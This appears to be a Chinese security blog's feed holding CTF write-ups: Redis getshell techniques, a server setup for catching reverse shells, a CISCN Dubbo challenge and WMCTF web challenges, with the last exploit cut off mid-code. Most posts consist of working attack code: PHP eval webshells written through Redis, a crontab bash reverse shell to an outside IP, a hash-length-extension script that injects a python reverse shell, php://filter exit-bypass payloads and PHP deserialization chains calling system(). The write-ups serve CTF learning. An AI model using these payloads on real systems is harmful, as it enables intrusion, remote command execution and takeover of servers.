    <content type="html"><![CDATA[<h1 id="redis-getshell的几种方法"><a href="#redis-getshell的几种方法" class="headerlink" title="redis getshell的几种方法"></a>redis getshell的几种方法</h1><ul><li>写文件<ul><li>Windows<ul><li>开机自启动目录</li></ul></li><li>Linux<ul><li>crontab</li><li>SSH key</li></ul></li><li>webshell</li></ul></li><li>反序列化<ul><li>java 反序列化<ul><li>jackson</li><li>fastjson</li><li>jdk/Hessian 反序列化</li></ul></li><li>python 反序列化</li><li>php 反序列化</li></ul></li><li>主从复制 RCE</li><li>Lua RCE</li></ul><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><ol><li><p>webshell</p><pre><code class="hljs php-template"><span class="xml">flushall</span><span class="xml">set 1 &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27;</span><span class="xml">config set dir /var/www/html</span><span class="xml">config set dbfilename shell.php</span><span class="xml">save</span></code></pre><p>一般用gopher协议打的时候需要转换</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllibprotocol=<span class="hljs-string">&quot;gopher://&quot;</span>ip=<span class="hljs-string">&quot;192.168.163.128&quot;</span>port=<span class="hljs-string">&quot;6379&quot;</span>shell=<span class="hljs-string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span>filename=<span class="hljs-string">&quot;shell.php&quot;</span>path=<span class="hljs-string">&quot;/var/www/html&quot;</span>passwd=<span class="hljs-string">&quot;&quot;</span>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),     <span class="hljs-string">&quot;save&quot;</span>     ]<span class="hljs-keyword">if</span> passwd:    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">redis_format</span>(<span class="hljs-params">arr</span>):</span>    CRLF=<span class="hljs-string">&quot;\r\n&quot;</span>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)    cmd=<span class="hljs-string">&quot;&quot;</span>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)    cmd+=CRLF    <span class="hljs-keyword">return</span> cmd<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:        payload += urllib.quote(redis_format(x))    <span class="hljs-built_in">print</span> payload</code></pre></li><li><p>写公匙</p><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br> 如果不存在，则可以利用<code>crontab</code>创建该目录</p></li><li><p>crontab 定时任务直接反弹shell linux</p><pre><code class="hljs routeros">flushall<span class="hljs-builtin-name">set</span> 1 <span class="hljs-string">&#x27;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n&#x27;</span>config <span class="hljs-builtin-name">set</span> dir /var/spool/cron/config <span class="hljs-builtin-name">set</span> dbfilename rootsave</code></pre></li><li><p>windows 自启目录</p></li></ol><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><h2 id="Lua-RCE"><a href="#Lua-RCE" class="headerlink" title="Lua RCE"></a>Lua RCE</h2><p>参考：</p><p><a href="https://paper.seebug.org/1169/#rce">https://paper.seebug.org/1169/#rce</a></p><p><a href="https://xz.aliyun.com/t/5665#toc-13">https://xz.aliyun.com/t/5665#toc-13</a></p><p><a href="https://mp.weixin.qq.com/s/W9joCtUQfNA62ZWXwqMmsw">https://mp.weixin.qq.com/s/W9joCtUQfNA62ZWXwqMmsw</a></p><p><a href="https://www.anquanke.com/post/id/181599">https://www.anquanke.com/post/id/181599</a></p><p><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>服务器配置</title>
    <link href="/2020/08/08/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    <url>/2020/08/08/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="买了一个新学生机，记录下配置"><a href="#买了一个新学生机，记录下配置" class="headerlink" title="买了一个新学生机，记录下配置"></a>买了一个新学生机，记录下配置</h1><h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse-shell"></a>reverse-shell</h2><p>项目地址：<a href="https://github.com/lukechilds/reverse-shell">https://github.com/lukechilds/reverse-shell</a></p><p>下载后</p><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> installnohup <span class="hljs-built_in">npm</span> start &amp;</code></pre><p>3000端口能看到服务了，主要用来反弹shell</p><h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>我直接把以前的配置拉过去了，启动下就可</p><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> frpchmod 777 *nohup <span class="hljs-string">./frps</span> -c frps.ini &amp;</code></pre><p>kali映射过去试试,</p><pre><code class="hljs 1c">nohup ./frpc -c frpc.ini <span class="hljs-meta">&amp;</span></code></pre><p>能访问 ojbk</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><pre><code class="hljs livecodeserver">curl -fsSL <span class="hljs-keyword">https</span>://<span class="hljs-built_in">get</span>.docker.com | bash -s docker <span class="hljs-comment">--mirror Aliyun</span>启动dockersudo service docker <span class="hljs-built_in">start</span></code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>[CISCN2019 总决赛 Day1 Web2]Homebrew Dubbo</title>
    <link href="/2020/08/06/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web2-Homebrew-Dubbo/"/>
    <url>/2020/08/06/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web2-Homebrew-Dubbo/</url>
    
    <content type="html"><![CDATA[<p>观察js发现list接口</p><p>/static/js/app.4d269ccff489d8a081d1.js注释中有</p><p>//# sourceMappingURL=app.4d269ccff489d8a081d1.js.map</p><p>访问发现 /api/upload/list 下有token可以下载到所有的软件，可以下载发现第一个token就是源码包</p><pre><code class="hljs awk"><span class="hljs-regexp">/api/u</span>pload?token=eyJzaWduIjoiTXpSaVlqQXhaR0l4WWpKak0yVmpObU5oT0dZME4yRmlPR0k0WldZNU4yUT0iLCJpZCI6Ik1qVmpZamd6WVRZdFkyRXhZUzAwWlRnekxUazFaR0V0TW1RelpEaGtZemhoWW1ZNCJ9</code></pre><p>id处有命令拼接，sign的验证可以hash长度扩展攻击绕过，附上赵总脚本</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-comment"># -*- coding:utf8 -*-</span><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> hashpumpy<span class="hljs-keyword">import</span> json<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> uuid<span class="hljs-keyword">import</span> requestshost = <span class="hljs-string">&#x27;72a27156-8313-47d2-82c6-357118c82db0.node3.buuoj.cn&#x27;</span>port = <span class="hljs-string">&#x27;&#x27;</span>command = <span class="hljs-string">&quot;&quot;&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.2.217.127&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span><span class="hljs-comment"># &quot;java -Dspring.profiles.active=prod/localhost -jar /tmp/fl.jar&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uploadTestFile</span>():</span>    r = requests.post(<span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span>  + <span class="hljs-string">&quot;/api/upload&quot;</span>,                      files=[(<span class="hljs-string">&#x27;file&#x27;</span>, (<span class="hljs-string">&#x27;testa.txt&#x27;</span>, <span class="hljs-string">&#x27;abcd&#x27;</span>))])    <span class="hljs-keyword">return</span> r.json()[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;token&#x27;</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rceToGetFile</span>(<span class="hljs-params">token</span>):</span>    filename = <span class="hljs-built_in">str</span>(uuid.uuid4())    data = json.loads(base64.b64decode(token))    <span class="hljs-built_in">id</span> = base64.b64decode(data[<span class="hljs-string">&#x27;id&#x27;</span>])    sign = base64.b64decode(data[<span class="hljs-string">&#x27;sign&#x27;</span>])    result = hashpumpy.hashpump(sign, <span class="hljs-built_in">id</span>,                                <span class="hljs-string">&#x27;;&#x27;</span> + command + <span class="hljs-string">&#x27; &gt;&gt; &#x27;</span> + filename + <span class="hljs-string">&#x27;.txt;zip &#x27;</span> + filename + <span class="hljs-string">&#x27;.zip &#x27;</span> + filename + <span class="hljs-string">&#x27;.txt;rm -rf &#x27;</span> + filename + <span class="hljs-string">&#x27;.txt;&#x27;</span>,                                <span class="hljs-number">32</span>)    data[<span class="hljs-string">&#x27;id&#x27;</span>] = base64.b64encode(result[<span class="hljs-number">1</span>]).decode()    data[<span class="hljs-string">&#x27;sign&#x27;</span>] = base64.b64encode(result[<span class="hljs-number">0</span>].encode()).decode()    token = base64.b64encode(json.dumps(data).encode())    <span class="hljs-keyword">try</span>:        requests.get(<span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span>  + <span class="hljs-string">&quot;/api/upload&quot;</span>, params=&#123;<span class="hljs-string">&#x27;token&#x27;</span>: token&#125;, timeout=<span class="hljs-number">5</span>)    <span class="hljs-keyword">except</span>:        <span class="hljs-keyword">pass</span>    <span class="hljs-keyword">return</span> filename<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getTargetFileToken</span>(<span class="hljs-params">filename</span>):</span>    r = requests.get(<span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span>  + <span class="hljs-string">&quot;/api/upload/list&quot;</span>)    data = r.json()[<span class="hljs-string">&#x27;data&#x27;</span>]    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data:        <span class="hljs-keyword">if</span> item[<span class="hljs-string">&#x27;id&#x27;</span>] == filename:            <span class="hljs-keyword">return</span> item[<span class="hljs-string">&#x27;token&#x27;</span>]    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params">token</span>):</span>    r = requests.get(<span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span>  + <span class="hljs-string">&quot;/api/upload&quot;</span>, params=&#123;<span class="hljs-string">&#x27;token&#x27;</span>: token&#125;)    origin_text = r.text    <span class="hljs-keyword">return</span> origin_text<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    print(<span class="hljs-string">&quot;[*]上传测试文件，获取 Token 中....&quot;</span>)    token = uploadTestFile()    print(<span class="hljs-string">&quot;[+]Token:&quot;</span> + token)    print(<span class="hljs-string">&quot;[*]在 Token 的 ID 后追加字符串造成 RCE，并利用 Hash 长度扩展攻击来计算新的 sign。&quot;</span>)    filename = rceToGetFile(token)    print(<span class="hljs-string">&quot;[+]Flag 已被保存到服务器上的文件：&quot;</span> + filename)    print(<span class="hljs-string">&quot;[*]从文件列表中获取该文件的 Token：&quot;</span>)    flag_token = getTargetFileToken(filename)    print(<span class="hljs-string">&quot;[+]Token 获取成功，Token:&quot;</span> + flag_token)    print(<span class="hljs-string">&quot;[*]正在下载结果文件：&quot;</span>)    flag = getFlag(flag_token)    print(<span class="hljs-string">&quot;[+]结果下载成功，结果：&quot;</span> + flag)</code></pre><p>flag在根目录下，java2才能读，而现在是java3</p><p>ps -ef 发现java2运行了flag_provider，参考部署文档，在别的端口再部署修改后的frontend_consumer 调用flag_provider，打包上传成1.jar</p><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-Dspring.profiles.active=prod -<span class="hljs-keyword">jar </span>f.<span class="hljs-keyword">jar</span></code></pre><p>部署上访问后就有flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>buu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wmctf复现</title>
    <link href="/2020/08/04/wmctf%E5%A4%8D%E7%8E%B0/"/>
    <url>/2020/08/04/wmctf%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a>web_checkin</h2><p>直接传/flag,然后非预期上了 web_checkin2</p><p>还可以利用LFI + php7崩溃</p><p> <a href="https://xz.aliyun.com/t/5535#toc-7">https://xz.aliyun.com/t/5535#toc-7</a></p><p><a href="https://www.jianshu.com/p/dfd049924258">https://www.jianshu.com/p/dfd049924258</a></p><p>还可以直接用伪协议</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*/*$a = urldecode(&#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[sky]);?&gt;/resource=123.php&#x27;);*/</span><span class="hljs-comment">//$a = urldecode(&quot;php://filter/string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%28%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resource=123.php&quot;);</span><span class="hljs-comment">//file_put_contents($a,&quot;<span class="hljs-meta">&lt;?php</span> exit();&quot;.$a);</span><span class="hljs-comment"># 生成zlib.inflate能解压的东西</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strToHex</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;    <span class="hljs-variable">$hex</span>=<span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$str</span>)<span class="hljs-number">-1</span>;<span class="hljs-variable">$i</span>++) &#123;        <span class="hljs-variable">$len</span> = strlen(dechex(ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>])));        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$len</span> === <span class="hljs-number">1</span>) &#123;            <span class="hljs-variable">$hex</span> = <span class="hljs-variable">$hex</span> . <span class="hljs-string">&quot;%0&quot;</span> . dechex(ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]));        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$hex</span> = <span class="hljs-variable">$hex</span> . <span class="hljs-string">&quot;%&quot;</span> . dechex(ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]));        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-variable">$hex</span>;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;php://filter/zlib.deflate/resource=123.php&quot;</span>;file_put_contents(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;&lt;?php system($_GET[_]);?&gt;&#x27;</span>);<span class="hljs-variable">$handle</span> = file_get_contents(<span class="hljs-string">&quot;123.php&quot;</span>);<span class="hljs-keyword">echo</span> var_dump(strToHex(<span class="hljs-variable">$handle</span>));<span class="hljs-comment"># 要在前后加上?&gt;&lt;?去掉多余的东西</span></code></pre><p><a href="https://www.anquanke.com/post/id/202510">https://www.anquanke.com/post/id/202510</a></p><p><a href="https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md">https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md</a></p><p>再或者先压缩再解压</p><p>预留了zlib、bzip2、string等过滤器， <code>php:filter</code> 支持使用多个过滤器，所以可以利用 <code>zlib</code> 的 <code>zlib.deflate</code> 和 <code>zlib.inflate</code> 来做，压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间操作时候会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit👇</p><pre><code class="hljs php">php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span>%0deval($_GET[1]);<span class="hljs-meta">?&gt;</span>/resource=Cyc1e.php </span></code></pre><p>第三种解法可以用url编码，file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的。</p><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-keyword">string</span>.rot13|<span class="hljs-meta">&lt;?</span>cuc riny(<span class="hljs-variable">$_CBFG</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span>|/resource=Cyc1e.php</code></pre><p><a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</a></p><h2 id="Make-PHP-Great-Again"><a href="#Make-PHP-Great-Again" class="headerlink" title="Make PHP Great Again"></a>Make PHP Great Again</h2><p>非预期可以 session + lfi getshell 包shell</p><p><a href="https://xz.aliyun.com/t/5535#toc-7">https://xz.aliyun.com/t/5535#toc-7</a></p><p>然后也上了2</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>v2222.no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=php:<span class="hljs-regexp">//</span>filter/read=convert.base64-encode<span class="hljs-regexp">/resource=compress.zlib:/</span><span class="hljs-regexp">/file:/</span><span class="hljs-regexp">//</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php</code></pre><h2 id="webweb"><a href="#webweb" class="headerlink" title="webweb"></a>webweb</h2><p>搞不来，先把exp拿出来然后再分析下，太难了 qwq</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>\<span class="hljs-title">SQL</span> &#123;    <span class="hljs-title">class</span> <span class="hljs-title">Mapper</span> &#123;        <span class="hljs-title">protected</span>$<span class="hljs-title">props</span>;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$props</span></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;props=<span class="hljs-variable">$props</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">CLI</span> &#123;    <span class="hljs-title">class</span> <span class="hljs-title">Agent</span>&#123;        <span class="hljs-title">protected</span>$<span class="hljs-title">server</span>;        <span class="hljs-keyword">protected</span><span class="hljs-variable">$socket</span>;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$server</span></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;server=<span class="hljs-variable">$server</span>;            <span class="hljs-keyword">$this</span>-&gt;socket=<span class="hljs-string">&#x27;dir&#x27;</span>;        &#125;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WS</span></span>&#123;        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$events</span>= [];        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$events</span></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;events=<span class="hljs-variable">$events</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> &#123;    <span class="hljs-title">use</span> <span class="hljs-title">CLI</span>\<span class="hljs-title">Agent</span>;    <span class="hljs-keyword">use</span> <span class="hljs-title">CLI</span>\<span class="hljs-title">WS</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Basket</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$events</span>= [];        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$events</span></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;events=<span class="hljs-variable">$events</span>;        &#125;    &#125;    <span class="hljs-variable">$a0</span>=<span class="hljs-keyword">new</span> \DB\SQL\Mapper(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;read&quot;</span>=&gt;<span class="hljs-string">&quot;system&quot;</span>));    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Agent(<span class="hljs-variable">$a0</span>);    <span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> Basket(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;disconnect&quot;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;fetch&#x27;</span>)));    <span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> Agent(<span class="hljs-variable">$b</span>);    <span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> WS(<span class="hljs-variable">$c</span>);    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$d</span>)).<span class="hljs-string">&quot;\n&quot;</span>;&#125;</code></pre><p>难受</p><p>补充，这题用了两个trick</p><ol><li><pre><code>&lt;?phpclass flag&#123;    function here()&#123;        echo &quot;good&quot;;    &#125;&#125;</code></pre></li></ol><p>   $cs = array(new flag(),”here”);<br>   $cs();`<br>   <pre><code class="hljs reasonml"><span class="hljs-number">2.</span> ```   <span class="hljs-built_in">array</span>(<span class="hljs-keyword">new</span> CLI\<span class="hljs-constructor">WS()</span>,<span class="hljs-keyword">new</span> CLI\<span class="hljs-constructor">Agent()</span>)</code></pre></p><p>   直接传Agent类会去找Agent.php，而这里没有，所以为了解决找不到可以反序列话一个数组过去。</p><p>   也可以套娃像上面那个payload一样</p><p>exp</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">namespace</span> <span class="hljs-title">CLI</span>&#123;     <span class="hljs-title">class</span> <span class="hljs-title">Agent</span>     &#123;         <span class="hljs-title">protected</span> $<span class="hljs-title">server</span>;         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$server</span></span>) </span><span class="hljs-function">        </span>&#123;             <span class="hljs-keyword">$this</span>-&gt;server=<span class="hljs-variable">$server</span>;         &#125;     &#125;     <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WS</span> </span><span class="hljs-class">    </span>&#123;     &#125; &#125; <span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>&#123;     <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Cursor</span>  <span class="hljs-title">implements</span> \<span class="hljs-title">IteratorAggregate</span> &#123;&#125;     <span class="hljs-title">class</span> <span class="hljs-title">Mongo</span> &#123;         <span class="hljs-title">public</span> $<span class="hljs-title">events</span>;         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$events</span></span>) </span><span class="hljs-function">        </span>&#123;             <span class="hljs-keyword">$this</span>-&gt;events=<span class="hljs-variable">$events</span>;         &#125;     &#125; &#125; <span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>\<span class="hljs-title">Mongo</span>&#123;     <span class="hljs-title">class</span> <span class="hljs-title">Mapper</span> <span class="hljs-title">extends</span> \<span class="hljs-title">DB</span>\<span class="hljs-title">Cursor</span> &#123;         <span class="hljs-title">protected</span> $<span class="hljs-title">legacy</span>=0;         <span class="hljs-keyword">protected</span> <span class="hljs-variable">$collection</span>;         <span class="hljs-keyword">protected</span> <span class="hljs-variable">$document</span>;         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetExists</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>)</span>&#123;&#125;         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetGet</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>)</span>&#123;&#125;         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetSet</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span>, <span class="hljs-variable">$value</span></span>)</span>&#123;&#125;         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetUnset</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>)</span>&#123;&#125;         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIterator</span>(<span class="hljs-params"></span>)</span>&#123;&#125;             <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$collection</span>,<span class="hljs-variable">$document</span></span>)</span>&#123;             <span class="hljs-keyword">$this</span>-&gt;collection=<span class="hljs-variable">$collection</span>;             <span class="hljs-keyword">$this</span>-&gt;document=<span class="hljs-variable">$document</span>;         &#125;     &#125; &#125; <span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>\<span class="hljs-title">SQL</span>&#123;     <span class="hljs-title">class</span> <span class="hljs-title">Mapper</span> <span class="hljs-title">extends</span> \<span class="hljs-title">DB</span>\<span class="hljs-title">Cursor</span>&#123;         <span class="hljs-title">protected</span> $<span class="hljs-title">props</span>=[&quot;<span class="hljs-title">insertone</span>&quot;=&gt;&quot;<span class="hljs-title">system</span>&quot;];         <span class="hljs-function"><span 